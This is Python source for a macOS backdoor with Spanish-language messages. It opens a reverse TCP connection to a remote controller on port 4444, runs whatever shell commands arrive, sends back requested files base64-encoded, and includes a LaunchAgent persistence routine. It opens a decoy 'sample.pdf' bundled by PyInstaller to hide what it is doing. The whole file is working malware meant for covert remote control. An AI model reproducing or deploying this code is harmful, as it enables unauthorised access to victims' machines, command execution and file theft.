import socket
import subprocess
import json
import os
import base64
import sys

class MacOS:
    def __init__(self, ip, port):
        #self.make_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def make_persistent(self):
        location = os.path.expanduser("~/Library/LaunchAgents/com.mybackdoor.agent.plist")
        if not os.path.exists(location):
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0">
            <dict>
                <key>Label</key>
                <string>com.myapp.agent</string>
                <key>ProgramArguments</key>
                <array>
                    <string>{sys.executable}</string>
                </array>
                <key>RunAtLoad</key>
                <true/>
            </dict>
            </plist>'''
            with open(location, 'w') as f:
                f.write(plist_content)
            subprocess.call(['launchctl', 'load', location])

    def cmd(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8')
        except subprocess.CalledProcessError as e:
            return f"Error ejecutando comando: {e.output.decode('utf-8')}"

    def reliable_send(self, data):
        if isinstance(data, bytes):
            # Enviar primero la longitud del archivo
            json_data = json.dumps({"size": len(data)})
            self.connection.send(json_data.encode('utf-8'))
            # Luego, enviar el archivo en sí, codificado en base64
            self.connection.send(base64.b64encode(data))
        else:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def change_directory(self, path):
        try:
            os.chdir(path)
            return f"Cambiando de directorio a {path}"
        except FileNotFoundError:
            return f"Error: No se pudo cambiar al directorio {path}"

    def leer_archivo(self, archivo):
        try:
            with open(archivo, 'rb') as file:
                contenido = file.read()
                return contenido
        except FileNotFoundError:
            return f"Error: El archivo {archivo} no existe."

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                result = self.change_directory(command[1])
            elif command[0] == "cd":
                result = self.change_directory(os.path.expanduser("~"))
            elif command[0] == "download":
                result = self.leer_archivo(command[1])
            else:
                result = self.cmd(" ".join(command))
            self.reliable_send(result)

file_name = sys._MEIPASS + "\sample.pdf"
subprocess.Popen(file_name, shell=True)

door = MacOS("", 4444)
door.run()
